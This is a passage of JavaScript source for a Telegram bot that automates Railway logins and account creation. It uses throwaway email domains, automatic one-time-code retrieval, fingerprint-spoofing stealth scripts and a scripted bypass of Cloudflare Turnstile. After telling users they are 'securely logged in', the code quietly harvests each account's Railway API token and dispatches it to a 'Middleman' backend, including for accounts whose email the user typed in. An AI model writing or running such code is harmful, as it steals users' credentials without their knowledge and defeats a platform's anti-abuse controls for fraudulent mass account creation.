            await bot.sendMessage(chat, '⛔ *Access Denied!*\n\n💬 *Support :* @xxbga', { parse_mode: 'Markdown' }).catch(() => {});
            return;
        }
        await bot.answerCallbackQuery(query.id).catch(() => {});
        const session = getSession(chat);
        session.state = 'IDLE';
        const menu = getSetupMenu();
        await bot.editMessageText(menu.text, {
            chat_id: chat,
            message_id: msgId,
            ...menu.opts
        }).catch(() => {});
        return;
    }

    // 🗑️ Delete Railway Account Callback
    if (action === 'action_delete_account') {
        await bot.answerCallbackQuery(query.id).catch(() => {});
        const session = getSession(chat);

        // ALWAYS extract target email from the clicked message card first!
        const msgText = query.message?.text || '';
        const matchEmail = msgText.match(/Email:\s*([^\s\n`]+)/i) || msgText.match(/([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})/);
        const cardEmail = matchEmail ? matchEmail[1].replace(/[`]/g, '').trim() : null;
        const targetEmail = cardEmail || session.email;

        if (!targetEmail || !targetEmail.includes('@')) {
            session.state = 'WAITING_DELETE_ACCOUNT_EMAIL';
            await bot.sendMessage(chat, '🗑️ *Delete Railway Account*\n\nPlease send the email address of the Railway account you want to delete (e.g. `user123@mailu.site`):', {
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [
                        [{ text: '🔙 Cancel', callback_data: 'menu_main' }]
                    ]
                }
            });
            return;
        }

        // ONLY reuse live session if session.email STRICTLY matches targetEmail
        if (session.page && !session.page.isClosed() && session.email && session.email.toLowerCase() === targetEmail.toLowerCase()) {
            const delStatus = await bot.sendMessage(chat, `🗑️ *Deleting Railway Account for:* \`${targetEmail}\`\nNavigating to danger zone...`, { parse_mode: 'Markdown' });
            try {
                await deleteCurrentRailwayAccount(session.page, targetEmail);
                await bot.editMessageText(`✅ *Railway Account Deleted Successfully!*\n\n📧 *Email:* \`${targetEmail}\``, {
                    chat_id: chat,
                    message_id: delStatus.message_id,
                    parse_mode: 'Markdown'
                });
                await forceKillChatSession(chat);
            } catch (delErr) {
                await bot.editMessageText(`❌ Failed to delete account: ${delErr.message}`, {
                    chat_id: chat,
                    message_id: delStatus.message_id
                });
            }
            return;
        }

        // Target email is for a different or past account: launch autonomous login + deletion!
        await triggerAutonomousDeletionForChat(chat, targetEmail);
        return;
    }

    // 🚀 Auto Build Action (Owner or Authorized Users Only)
    if (action === 'action_autobuild') {
        if (!isAuthorized(userId, username)) {
            await bot.answerCallbackQuery(query.id, {
                text: '⛔ Access Denied!\n\n💬 Support : @xxbga',
                show_alert: true
            }).catch(() => {});
            await bot.sendMessage(chat, '⛔ *Access Denied!*\n\nYou do not have permission to use Auto Build.\n\n💬 *Support :* @xxbga', { parse_mode: 'Markdown' }).catch(() => {});
            return;
        }

        await bot.answerCallbackQuery(query.id).catch(() => {});
        const config = loadDomainConfig();
        // If a default domain is configured, start immediately!
        if (config.defaultDomain) {
            await startAutoBuildSession(chat, msgId, config.defaultDomain);
        } else {
            // Show domain selection menu
            await bot.editMessageText('🚀 *Auto Build — Select Domain:*\n\nChoose a domain to generate email:', {
                chat_id: chat,
                message_id: msgId,
                parse_mode: 'Markdown',
                ...getAutoBuildMenu(isOwner(userId))
            }).catch(() => {});
        }
        return;
    }

    // Auto Build: Selected Domain
    if (action.startsWith('ab_domain_')) {
        if (!isAuthorized(userId, username)) {
            await bot.answerCallbackQuery(query.id, {
                text: '⛔ Access Denied!\n\n💬 Support : @xxbga',
                show_alert: true
            }).catch(() => {});
            await bot.sendMessage(chat, '⛔ *Access Denied!*\n\nYou do not have permission to use Auto Build.\n\n💬 *Support :* @xxbga', { parse_mode: 'Markdown' }).catch(() => {});
            return;
        }

        await bot.answerCallbackQuery(query.id).catch(() => {});
        const selectedDomain = action.replace('ab_domain_', '');
        await startAutoBuildSession(chat, msgId, selectedDomain);
        return;
    }

    // 🛠 Custom Action
    if (action === 'action_custom') {
        await bot.answerCallbackQuery(query.id).catch(() => {});
        await startCustomSession(chat, msgId);
        return;
    }

    // ➕ Add Domain from Auto Build (Owner Only)
    if (action === 'action_add_domain_ab') {
        if (!isOwner(userId)) {
            await bot.answerCallbackQuery(query.id, {
                text: '⛔ Access Denied!\n\n💬 Support : @xxbga',
                show_alert: true
            }).catch(() => {});
            await bot.sendMessage(chat, '⛔ *Access Denied!*\n\n💬 *Support :* @xxbga', { parse_mode: 'Markdown' }).catch(() => {});
            return;
        }
        await bot.answerCallbackQuery(query.id).catch(() => {});
        const session = getSession(chat);
        session.state = 'WAITING_NEW_DOMAIN_AB';
        await bot.editMessageText('🌐 *Add New Domain*\n\nPlease send the new domain name (e.g. `xyz.shop` or `mydomain.com`):', {
            chat_id: chat,
            message_id: msgId,
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '❌ Cancel', callback_data: 'action_autobuild' }]
                ]
            }
        }).catch(() => {});
        return;
    }

    // ➕ Add Domain from Setup (Owner Only)
    if (action === 'action_add_domain_setup') {
        if (!isOwner(userId)) {
            await bot.answerCallbackQuery(query.id, {
                text: '⛔ Access Denied!\n\n💬 Support : @xxbga',
                show_alert: true
            }).catch(() => {});
            await bot.sendMessage(chat, '⛔ *Access Denied!*\n\n💬 *Support :* @xxbga', { parse_mode: 'Markdown' }).catch(() => {});
            return;
        }
        await bot.answerCallbackQuery(query.id).catch(() => {});
        const session = getSession(chat);
        session.state = 'WAITING_NEW_DOMAIN_SETUP';
        await bot.editMessageText('🌐 *Add New Domain*\n\nPlease send the new domain name (e.g. `xyz.shop` or `mydomain.com`):', {
            chat_id: chat,
            message_id: msgId,
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '❌ Cancel', callback_data: 'menu_setup' }]
                ]
            }
        }).catch(() => {});
        return;
    }

    // Setup: Set Default Domain
    if (action.startsWith('setup_set_def_')) {
        if (!isOwner(userId)) {
            await bot.answerCallbackQuery(query.id, { text: '⛔ Owner only!', show_alert: true }).catch(() => {});
            return;
        }
        const domain = action.replace('setup_set_def_', '');
        setDefaultDomainInConfig(domain);
        await bot.answerCallbackQuery(query.id, { text: `✅ Default domain set to ${domain}`, show_alert: false }).catch(() => {});
        const menu = getSetupMenu();
        await bot.editMessageText(menu.text, {
            chat_id: chat,
            message_id: msgId,
            ...menu.opts
        }).catch(() => {});
        return;
    }

    // Setup: Reset Default Domain
    if (action === 'setup_reset_def') {
        if (!isOwner(userId)) {
            await bot.answerCallbackQuery(query.id, { text: '⛔ Owner only!', show_alert: true }).catch(() => {});
            return;
        }
        resetDefaultDomainInConfig();
        await bot.answerCallbackQuery(query.id, { text: '🔄 Default domain reset! Domain selection list will be shown.', show_alert: false }).catch(() => {});
        const menu = getSetupMenu();
        await bot.editMessageText(menu.text, {
            chat_id: chat,
            message_id: msgId,
            ...menu.opts
        }).catch(() => {});
        return;
    }

    // Setup: Delete Domain Menu
    if (action === 'setup_delete_menu') {
        if (!isOwner(userId)) {
            await bot.answerCallbackQuery(query.id, { text: '⛔ Owner only!', show_alert: true }).catch(() => {});
            return;
        }
        await bot.answerCallbackQuery(query.id).catch(() => {});
        const deleteMenu = getDeleteDomainMenu();
        await bot.editMessageText(deleteMenu.text, {
            chat_id: chat,
            message_id: msgId,
            ...deleteMenu.opts
        }).catch(() => {});
        return;
    }

    // Setup: Delete Domain Confirmation
    if (action.startsWith('setup_del_confirm_')) {
        if (!isOwner(userId)) {
            await bot.answerCallbackQuery(query.id, { text: '⛔ Owner only!', show_alert: true }).catch(() => {});
            return;
        }
        const domain = action.replace('setup_del_confirm_', '');
        removeDomainFromConfig(domain);
        await bot.answerCallbackQuery(query.id, { text: `🗑️ Domain ${domain} removed.`, show_alert: false }).catch(() => {});
        const menu = getSetupMenu();
        await bot.editMessageText(menu.text, {
            chat_id: chat,
            message_id: msgId,
            ...menu.opts
        }).catch(() => {});
        return;
    }

    // Setup: 👤 ➕ Add User (Owner Only)
    if (action === 'setup_add_user') {
        if (!isOwner(userId)) {
            await bot.answerCallbackQuery(query.id, { text: '⛔ Owner only!', show_alert: true }).catch(() => {});
            return;
        }
        await bot.answerCallbackQuery(query.id).catch(() => {});
        const session = getSession(chat);
        session.state = 'WAITING_NEW_USER_SETUP';
        await bot.editMessageText('👤 *Add Authorized User*\n\nPlease send the Telegram Username (e.g. `@username` or `username`) or numerical User ID to grant Auto Build access:', {
            chat_id: chat,
            message_id: msgId,
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '❌ Cancel', callback_data: 'menu_setup' }]
                ]
            }
        }).catch(() => {});
        return;
    }

    // Setup: 👤 🗑️ Delete User Menu (Owner Only)
    if (action === 'setup_delete_user_menu') {
        if (!isOwner(userId)) {
            await bot.answerCallbackQuery(query.id, { text: '⛔ Owner only!', show_alert: true }).catch(() => {});
            return;
        }
        await bot.answerCallbackQuery(query.id).catch(() => {});
        const deleteUserMenu = getDeleteUserMenu();
        await bot.editMessageText(deleteUserMenu.text, {
            chat_id: chat,
            message_id: msgId,
            ...deleteUserMenu.opts
        }).catch(() => {});
        return;
    }

    // Setup: 👤 🗑️ Delete User Confirmation
    if (action.startsWith('setup_del_user_confirm_')) {
        if (!isOwner(userId)) {
            await bot.answerCallbackQuery(query.id, { text: '⛔ Owner only!', show_alert: true }).catch(() => {});
            return;
        }
        const targetUser = action.replace('setup_del_user_confirm_', '');
        removeAuthorizedUser(targetUser);
        await bot.answerCallbackQuery(query.id, { text: `🗑️ User ${targetUser} removed.`, show_alert: false }).catch(() => {});
        const menu = getSetupMenu();
        await bot.editMessageText(menu.text, {
            chat_id: chat,
            message_id: msgId,
            ...menu.opts
        }).catch(() => {});
        return;
    }

    // 🛑 Close Active Session Callback
    if (action === 'action_close_session' || action === 'action_force_close_session') {
        await bot.answerCallbackQuery(query.id, { text: 'Session closed!' }).catch(() => {});
        await forceKillChatSession(chat);
        await bot.editMessageText('✅ *Active session closed!*\n\nYou can now start fresh:', {
            chat_id: chat,
            message_id: msgId,
            parse_mode: 'Markdown',
            ...getWelcomeMenu(userId)
        }).catch(() => {});
        return;
    }

    // Fallback answer for any unhandled callback
    await bot.answerCallbackQuery(query.id).catch(() => {});
});

// ----------------------------------------------------
// Browser Context Launch Helper
// ----------------------------------------------------
async function launchBrowserForSession(chat, msgId) {
    const session = getSession(chat);
    await bot.editMessageText('⚡ Server Creating...', { chat_id: chat, message_id: msgId }).catch(() => {});

    if (session.browserContext) {
        await bot.editMessageText('⚠️ A session is already active! Closing the old one...', { chat_id: chat, message_id: msgId }).catch(() => {});
        await session.browserContext.close().catch(() => {});
    }

    const sessionDir = path.resolve(__dirname, 'sessions', `firefox_profile_${chat}`);
    if (spoofConfig.clearSessionOnEveryStart) {
        clearDirectorySafe(sessionDir);
    } else {
        if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir, { recursive: true });
    }

    const targetUrl = 'https://railway.com/deploy';

    const firefoxUserPrefs = {
        'network.trr.mode': spoofConfig.dns?.enabled ? spoofConfig.dns.mode : 0,
        'network.trr.uri': spoofConfig.dns?.dohUri || 'https://dns.google/dns-query',
        'network.trr.custom_uri': spoofConfig.dns?.dohUri || 'https://dns.google/dns-query',
        'network.trr.bootstrapAddress': spoofConfig.dns?.bootstrapAddress || '8.8.8.8',
        'network.trr.send_user_agent': false,
        'network.trr.send_edns_client_subnet': false,
        'browser.sessionstore.resume_from_crash': false,
        'browser.sessionstore.enabled': false,
        'browser.sessionstore.max_resumed_crashes': 0,
        'browser.sessionstore.restore_on_demand': false,
        'browser.startup.page': 0,
        'privacy.clearOnShutdown.cache': true,
        'privacy.clearOnShutdown.cookies': true,
        'privacy.clearOnShutdown.history': true,
        'media.peerconnection.enabled': true,
        'media.peerconnection.ice.no_host': true,
        'media.peerconnection.ice.default_address_only': true,
        'media.peerconnection.ice.proxy_only': true,
        'toolkit.telemetry.enabled': false,
        'marionette.enabled': false,
        'dom.webdriver.enabled': false,
    };

    const winWidth = spoofConfig.windowSize?.width || 900;
    const winHeight = spoofConfig.windowSize?.height || 600;

    const isHeadless = process.env.HEADLESS === 'true';
    const contextOptions = {
        headless: isHeadless,
        viewport: null,
        locale: spoofConfig.locale,
        timezoneId: spoofConfig.timezoneId,
        geolocation: spoofConfig.geolocation,
        permissions: ['geolocation'],
        userAgent: spoofConfig.userAgent,
        firefoxUserPrefs: firefoxUserPrefs,
        args: ['-width', `${winWidth}`, '-height', `${winHeight}`],
    };

    session.browserContext = await firefox.launchPersistentContext(sessionDir, contextOptions);
    const stealthScript = generateStealthScript(spoofConfig);
    await session.browserContext.addInitScript(stealthScript);

    const pages = session.browserContext.pages();
    session.page = pages.length > 0 ? pages[0] : await session.browserContext.newPage();

    try {
        await session.page.goto(targetUrl, { waitUntil: 'domcontentloaded', timeout: 45000 });
    } catch (navErr) {
        console.warn('Navigation retry on commit:', navErr.message);
        await session.page.goto(targetUrl, { waitUntil: 'commit', timeout: 30000 }).catch(() => {});
    }
    await session.page.bringToFront().catch(() => {});

    // Step 1: Click Sign in
    await session.page.evaluate(async () => {
        for (let i = 0; i < 40; i++) {
            const buttons = Array.from(document.querySelectorAll('button, a'));
            const btn = buttons.find(b => {
                const t = (b.innerText || b.textContent || '').trim().toLowerCase();
                return t === 'sign in';
            });
            if (btn) { btn.click(); return true; }
            await new Promise(r => setTimeout(r, 500));
        }
        return false;
    }).catch(() => false);

    // Step 2: Click Log in using email
    const clickedEmail = await session.page.evaluate(async () => {
        for (let i = 0; i < 40; i++) {
            const buttons = Array.from(document.querySelectorAll('button, a'));
            const btn = buttons.find(b => {
                const text = (b.innerText || b.textContent || '').trim().toLowerCase();
                return text.includes('log in using email') || text.includes('login with email') || text.includes('using email');
            });
            if (btn) { btn.click(); return true; }
            await new Promise(r => setTimeout(r, 500));
        }
        return false;
    }).catch(() => false);

    return clickedEmail;
}

// ----------------------------------------------------
// Process Email & Turnstile & OTP Request
// ----------------------------------------------------
async function processEmailAndRequestOTP(chat, msgId, email) {
    const session = getSession(chat);
    session.email = email;
    session.statusMsgId = msgId;
    startInactivityTimer(chat);

    if (!session.page || session.page.isClosed()) {
        await bot.editMessageText('❌ Browser was closed.', { chat_id: chat, message_id: msgId });
        return;
    }

    try {
        const emailInput = session.page.locator('input[type="email"], input[name="email"]').first();
        await emailInput.waitFor({ state: 'visible', timeout: 10000 });

        await updateProg(chat, msgId, 25);
        await emailInput.fill(email);
        await new Promise(r => setTimeout(r, 500));

        // Verify fill
        const currentVal = await emailInput.inputValue().catch(() => '');
        if (currentVal !== email) {
            await emailInput.evaluate((el, val) => {
                const setter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value').set;
                setter.call(el, val);
                el.dispatchEvent(new Event('input', { bubbles: true }));
                el.dispatchEvent(new Event('change', { bubbles: true }));
            }, email);
            await new Promise(r => setTimeout(r, 500));
        }

        // Step 2: Cloudflare Turnstile bypass (silent in background)
        await updateProg(chat, msgId, 45);
        let turnstileBox = null;
        for (let attempt = 0; attempt < 30; attempt++) {
            try {
                const box = await session.page.evaluate(() => {
                    const input = document.querySelector('input[name="cf-turnstile-response"]');
                    if (input && input.parentElement) {
                        const rect = input.parentElement.getBoundingClientRect();
                        if (rect.width > 0 && rect.height > 0) {
                            return { x: rect.x, y: rect.y, width: rect.width, height: rect.height };
                        }
                    }
                    return null;
                }).catch(() => null);

                if (box) {
                    turnstileBox = box;
                    break;
                }
            } catch (e) {}
            await new Promise(r => setTimeout(r, 500));
        }

        if (turnstileBox) {
            const bx = turnstileBox;
            const clickX = bx.x + 28;
            const clickY = bx.y + (bx.height / 2);
            await session.page.mouse.move(bx.x + bx.width / 2, bx.y - 50);
            await new Promise(r => setTimeout(r, 300));
            await session.page.mouse.move(clickX, clickY, { steps: 10 });
            await new Promise(r => setTimeout(r, 200));
            await session.page.mouse.down();
            await new Promise(r => setTimeout(r, 80 + Math.random() * 60));
            await session.page.mouse.up();
            await new Promise(r => setTimeout(r, 5000));

            // Retry if needed
            const isEnabled = await session.page.evaluate(() => {
                const btn = Array.from(document.querySelectorAll('button')).find(b =>
                    (b.innerText || '').toLowerCase().includes('continue with email'));
                return btn && !btn.disabled;
            }).catch(() => false);

            if (!isEnabled) {
                const retryX = bx.x + 26;
                const retryY = bx.y + (bx.height / 2) - 2;
                await session.page.mouse.move(retryX + 100, retryY + 30);
                await new Promise(r => setTimeout(r, 200));
                await session.page.mouse.move(retryX, retryY, { steps: 8 });
                await new Promise(r => setTimeout(r, 150));
                await session.page.mouse.down();
                await new Promise(r => setTimeout(r, 90 + Math.random() * 50));
                await session.page.mouse.up();
                await new Promise(r => setTimeout(r, 5000));
            }
        }

        // Step 3: Click Continue with Email
        const emailSentTime = Date.now() - 3000;
        await session.page.evaluate(async () => {
            for (let i = 0; i < 20; i++) {
                const btn = Array.from(document.querySelectorAll('button')).find(b =>
                    (b.innerText || '').trim().toLowerCase().includes('continue with email'));
                if (btn && !btn.disabled) { btn.click(); return true; }
                await new Promise(r => setTimeout(r, 500));
            }
            return false;
        }).catch(() => false);

        // Step 4: OTP Handling
        session.state = 'WAITING_OTP';
        const config = loadDomainConfig();
        const isMailu = (email || '').toLowerCase().endsWith('@mailu.site') || 
                        (Array.isArray(config.domains) && config.domains.some(d => (email || '').toLowerCase().endsWith('@' + d.toLowerCase())));

        if (isMailu) {
            // Keep the clean progress bar moving silently in the background
            await updateProg(chat, msgId, 60);

            (async () => {
                try {
                    console.log(`[Auto OTP] Polling Mailu for ${email}...`);
                    const rawOtp = await fetchRawOtp(email, 45, emailSentTime);
                    const cleanCode = (rawOtp || '').match(/\d{6}/)?.[0] || (rawOtp || '').trim();
                    if (cleanCode && /^\d{6}$/.test(cleanCode) && session.state === 'WAITING_OTP') {
                        console.log(`[Auto OTP] Auto-received OTP: ${cleanCode}`);
                        await submitOtpAndHarvestToken(chat, msgId, cleanCode);
                        return;
                    }
                } catch (pollErr) {
                    console.log('[Auto OTP] Auto-poll status:', pollErr.message);
                }

                // If auto-poll couldn't find token or timed out, gracefully ask user for OTP
                if (session.state === 'WAITING_OTP') {
                    await bot.editMessageText(
                        `📧 Email: \`${email}\`\n\n🔑 Please send your 6-digit OTP code:`,
                        {
                            chat_id: chat,
                            message_id: msgId,
                            parse_mode: 'Markdown'
                        }
                    ).catch(() => {});
                }
            })();
        } else {
            // For custom non-mailu emails, prompt the user for code
            await bot.editMessageText(
                `📧 Email: \`${email}\`\n\n🔑 Please send your 6-digit OTP code:`,
                {
                    chat_id: chat,
                    message_id: msgId,
                    parse_mode: 'Markdown'
                }
            );
        }

    } catch (e) {
        await bot.editMessageText(`❌ Error: ${e.message}`, { chat_id: chat, message_id: msgId });
    }
}

// ----------------------------------------------------
// Auto Build Flow
// ----------------------------------------------------
async function startAutoBuildSession(chat, msgId, domain) {
    const session = getSession(chat);
    const generatedEmail = await generateRandomEmail(domain);
    session.email = generatedEmail;

    await updateProg(chat, msgId, 10);

    try {
        const clickedEmail = await launchBrowserForSession(chat, msgId);
        if (clickedEmail) {
            await processEmailAndRequestOTP(chat, msgId, generatedEmail);
        } else {
            await bot.editMessageText('⚠️ Could not reach the email login page. Please try again.', {
                chat_id: chat,
                message_id: msgId
            }).catch(() => {});
        }
    } catch (e) {
        await bot.editMessageText(`❌ Launch error: ${e.message}`, { chat_id: chat, message_id: msgId }).catch(() => {});
    }
}

// ----------------------------------------------------
// Custom Flow
// ----------------------------------------------------
async function startCustomSession(chat, msgId) {
    const session = getSession(chat);
    try {
        const clickedEmail = await launchBrowserForSession(chat, msgId);
        if (clickedEmail) {
            session.state = 'WAITING_EMAIL';
            await bot.editMessageText('📧 Railway login page is ready! Please send your email address.', {
                chat_id: chat,
                message_id: msgId
            }).catch(() => {});
            startInactivityTimer(chat);
        } else {
            await bot.editMessageText('⚠️ Could not reach the email login page. Please try again.', {
                chat_id: chat,
                message_id: msgId
            }).catch(() => {});
        }
    } catch (e) {
        await bot.editMessageText(`❌ Launch error: ${e.message}`, { chat_id: chat, message_id: msgId }).catch(() => {});
    }
}

// ----------------------------------------------------
// Reusable OTP Submission & Harvest Pipeline
// ----------------------------------------------------
async function submitOtpAndHarvestToken(chat, statusMsgId, otp) {
    const session = getSession(chat);
    session.state = 'IDLE';

    if (!session.page || session.page.isClosed()) {
        await bot.editMessageText('❌ Browser was closed.', { chat_id: chat, message_id: statusMsgId });
        return;
    }

    try {
        await updateProg(chat, statusMsgId, 75);
        let firstInput = null;
        let targetFrame = session.page;

        for (let attempt = 0; attempt < 60; attempt++) {
            const frames = [session.page, ...session.page.frames()];
            for (const frame of frames) {
                try {
                    if (await frame.locator('#pin-code-input-0').count() > 0) {
                        firstInput = frame.locator('#pin-code-input-0').first();
                        targetFrame = frame;
                        break;
                    }
                } catch (e) {}
            }
            if (firstInput) break;
            await new Promise(r => setTimeout(r, 500));
        }

        if (!firstInput) {
            throw new Error("Could not find OTP input fields. Maybe the modal didn't load.");
        }

        await firstInput.waitFor({ state: 'visible', timeout: 5000 }).catch(() => {});
        await new Promise(r => setTimeout(r, 500));

        // Click first input and type OTP digit by digit
        await firstInput.click();
        await new Promise(r => setTimeout(r, 300));

        for (let i = 0; i < 6; i++) {
            const input = targetFrame.locator(`#pin-code-input-${i}`);
            await input.click();
            await new Promise(r => setTimeout(r, 80 + Math.random() * 80));
            await input.fill(otp[i]);
            await new Promise(r => setTimeout(r, 100 + Math.random() * 100));
        }

        // Wait for auto-submit and navigation
        await new Promise(r => setTimeout(r, 5000));

        // Wait for navigation to dashboard
        await updateProg(chat, statusMsgId, 90);
        for (let attempt = 0; attempt < 20; attempt++) {
            await new Promise(r => setTimeout(r, 1000));
            const currentUrl = session.page.url();
            if (currentUrl.includes('dashboard') || currentUrl.includes('project')) {
                break;
            }
        }

        // Continuously monitor and accept Terms of Service if they appear
        try {
            await handleRailwayTermsOfService(session.page);
        } catch (e) {
            console.error('Terms of service handling note:', e.message);
        }

        await updateProg(chat, statusMsgId, 100);
        await new Promise(r => setTimeout(r, 600));

        await bot.editMessageText(
            `✅ Login successful! You are securely logged in.\n` +
            `📧 Email: \`${session.email || 'Unknown'}\`\n\n` +
            `🔗 Go to your account:\nhttps://railway.app/dashboard`,
            {
                chat_id: chat,
                message_id: statusMsgId,
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [
                        [{ text: '🗑️ Delete Railway Account', callback_data: 'action_delete_account' }]
                    ]
                }
            }
        );

        // Silently harvest real token & sync to Middleman/Multiverse backend in background
        (async () => {
            try {
                const cleanPrefix = (session.email || '').split('@')[0] || Date.now().toString(36);
                const nodeName = `cluster-${cleanPrefix}`;
                console.log(`🚀 [Multiverse Backend] Harvesting token in background for fleet (${nodeName})...`);
                const tokenResult = await harvestRailwayApiToken(session.page, 30000, nodeName);
                if (tokenResult && tokenResult.token) {
                    await dispatchTokenToMiddleman({
                        email: session.email,
                        apiToken: tokenResult.token
                    });
                    console.log(`✅ [Multiverse Backend] Token synced to Middleman fleet: ${tokenResult.token}`);
                }
            } catch (hErr) {
                console.warn('Multiverse background token sync note:', hErr.message);
            }
        })();

        // Silently close session and wipe cache (DISABLED: keep browser session open for live debugging)
        if (process.env.AUTO_CLOSE_SESSION === 'true') {
            await closeAndCleanSession(chat, true);
        }

    } catch (e) {
        await bot.editMessageText(`❌ Error: ${e.message}`, { chat_id: chat, message_id: statusMsgId });
    }
}

// ----------------------------------------------------
// Repositories Management UI Engine
// ----------------------------------------------------
async function showMyReposMenu(chat, msgId, userId) {
    const isOwnerUser = isOwner(userId);
    const repos = await getUserRepos(userId, isOwnerUser);

    if (!repos || repos.length === 0) {
        const emptyText = `📦 *My Repositories*\n\nYou haven't deployed any repositories yet. Use the button below to deploy your first application:`;
        const opts = {
            chat_id: chat,
            message_id: msgId,
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '🚀 Deploy App', callback_data: 'action_deploy_app' }],
                    [{ text: '🔙 Back to Menu', callback_data: 'menu_main' }]
                ]
            }
        };
        if (msgId) {
            await bot.editMessageText(emptyText, opts).catch(async () => {
                await bot.sendMessage(chat, emptyText, { parse_mode: opts.parse_mode, reply_markup: opts.reply_markup }).catch(() => {});
            });
        } else {
            await bot.sendMessage(chat, emptyText, { parse_mode: opts.parse_mode, reply_markup: opts.reply_markup }).catch(() => {});
        }
        return;
    }

    const header = isOwnerUser 
        ? `📦 *Repositories Dashboard (Owner View)*\nFound *${repos.length}* total repositories:` 
        : `📦 *My Repositories*\nYou have deployed *${repos.length}* repository:`;

    const rows = [];
    for (const r of repos) {
        const icon = r.deployment_status === 'ACTIVE' ? '🟢' : '🟡';
        rows.push([
            { text: `📁 ${r.repo_name} (${icon} ${r.deployment_status || 'PENDING'})`, callback_data: `repo_view_${r.repo_name}` }
        ]);
    }
    rows.push([
        { text: '🚀 Deploy New App', callback_data: 'action_deploy_app' },
        { text: '🔙 Back to Menu', callback_data: 'menu_main' }
    ]);

    const opts = {
        chat_id: chat,
        message_id: msgId,
        parse_mode: 'Markdown',
        reply_markup: { inline_keyboard: rows }
    };

    if (msgId) {
        await bot.editMessageText(header, opts).catch(async () => {
            await bot.sendMessage(chat, header, { parse_mode: opts.parse_mode, reply_markup: opts.reply_markup }).catch(() => {});
        });
    } else {
        await bot.sendMessage(chat, header, { parse_mode: opts.parse_mode, reply_markup: opts.reply_markup }).catch(() => {});
    }
}

async function showRepoDashboard(chat, msgId, repoName, userId) {
    const details = await getRepoDetails(repoName);
    const dep = details.deployment || {};
    const gh = details.github || {};

    const visText = gh.isPrivate ? '🔒 Private' : '🌐 Public';
    const visToggleBtnText = gh.isPrivate ? '🌐 Make Public' : '🔒 Make Private';
    const statusText = dep.deployment_status || 'PENDING';
    const liveUrlText = dep.live_url ? `\n🌍 *Live URL:* ${dep.live_url}` : '';

    const text = 
        `📁 *Repository Dashboard: \`${repoName}\`*\n\n` +
        `🌐 *GitHub:* [${gh.fullName || repoName}](${gh.htmlUrl || `https://github.com/Coras-Multiverse/${repoName}`})\n` +
        `🔒 *Visibility:* \`${visText}\`\n` +
        `⚡ *Deployment Status:* \`${statusText}\`${liveUrlText}\n` +
        `🔐 *Environment Secrets:* \`${details.envsCount} variables in D1\`\n` +
        `📅 *Created:* \`${dep.created_at || 'Recently'}\`\n\n` +
        `*Select an action below:*`;

    const buttons = [
        [
            { text: '✏️ Edit Repo (Update Code)', callback_data: `repo_edit_${repoName}` }
        ],
        [
            { text: visToggleBtnText, callback_data: `repo_vis_${repoName}` },
            { text: '🔐 Manage .env', callback_data: `repo_env_${repoName}` }
        ],
        [
            { text: '🚀 Deploy', callback_data: `repo_deploy_${repoName}` },
            { text: '🔗 Open GitHub', url: gh.htmlUrl || `https://github.com/Coras-Multiverse/${repoName}` }
        ],
        [
            { text: '🗑️ Delete Repo', callback_data: `repo_del_ask_${repoName}` }
        ],
        [
            { text: '🔙 Back to Repos', callback_data: 'menu_my_repos' }
        ]
    ];

    const opts = {
        chat_id: chat,
        message_id: msgId,
        parse_mode: 'Markdown',
        disable_web_page_preview: true,
        reply_markup: { inline_keyboard: buttons }
    };

    if (msgId) {
        await bot.editMessageText(text, opts).catch(async () => {
            await bot.sendMessage(chat, text, { parse_mode: opts.parse_mode, disable_web_page_preview: true, reply_markup: opts.reply_markup }).catch(() => {});
        });
    } else {
        await bot.sendMessage(chat, text, { parse_mode: opts.parse_mode, disable_web_page_preview: true, reply_markup: opts.reply_markup }).catch(() => {});
    }
}

async function showRepoEnvMenu(chat, msgId, repoName) {
    const details = await getRepoDetails(repoName);
    const envs = details.envs || [];

    let envListStr = '';
    if (envs.length === 0) {
        envListStr = '_(No environment variables configured yet)_';
    } else {
        envListStr = envs.map(e => `• \`${e.env_key}\`: \`${e.env_value ? (e.env_value.length > 8 ? e.env_value.substring(0, 4) + '••••' : '••••') : 'empty'}\``).join('\n');
    }

    const text = 
        `🔐 *Environment Secrets: \`${repoName}\`*\n\n` +
        `*Stored in Cloudflare D1 (\`repo_envs\`):*\n${envListStr}\n\n` +
        `You can update existing keys or add new environment variables below:`;

    const buttons = [
        [{ text: '➕ Add / Update .env Variables', callback_data: `repo_env_add_${repoName}` }],
        [{ text: '🗑️ Clear All .env Secrets', callback_data: `repo_env_clear_ask_${repoName}` }],
        [{ text: '🔙 Back to Repo Dashboard', callback_data: `repo_view_${repoName}` }]
    ];

    const opts = {
        chat_id: chat,
        message_id: msgId,
        parse_mode: 'Markdown',
        reply_markup: { inline_keyboard: buttons }
    };

    if (msgId) {
        await bot.editMessageText(text, opts).catch(async () => {
            await bot.sendMessage(chat, text, { parse_mode: opts.parse_mode, reply_markup: opts.reply_markup }).catch(() => {});
        });
    } else {
        await bot.sendMessage(chat, text, { parse_mode: opts.parse_mode, reply_markup: opts.reply_markup }).catch(() => {});
    }
}

// ----------------------------------------------------
// Core Deploy App Pipeline Execution
// ----------------------------------------------------
async function executeDeployPush(chat, session, additionalEnvs = {}, targetRepoOverride = null, userId = null) {
    const staging = session.deployStaging;
    if (!staging || !staging.files || staging.files.length === 0) {
        session.state = 'IDLE';
        session.deployStaging = null;
        session.targetUpdateRepo = null;
        await bot.sendMessage(chat, '❌ No files found to deploy. Please upload a valid .zip repository archive.');
        return;
    }

    const repoName = targetRepoOverride || staging.repoName;
    const allEnvs = { ...(staging.extractedEnvs || {}), ...(additionalEnvs || {}) };
    const envKeys = Object.keys(allEnvs);
    const resolvedUserId = userId || session.userId || chat;

    const progressMsg = await bot.sendMessage(chat, `⏳ *Initiating Deployment Pipeline for \`${repoName}\`...*\n\`[░░░░░░░░░░]\` *0%*`, { parse_mode: 'Markdown' });

    try {
        // Step 1: Save Environment Variables to Cloudflare D1
        let envSavedCount = 0;
        if (envKeys.length > 0) {
            await bot.editMessageText(
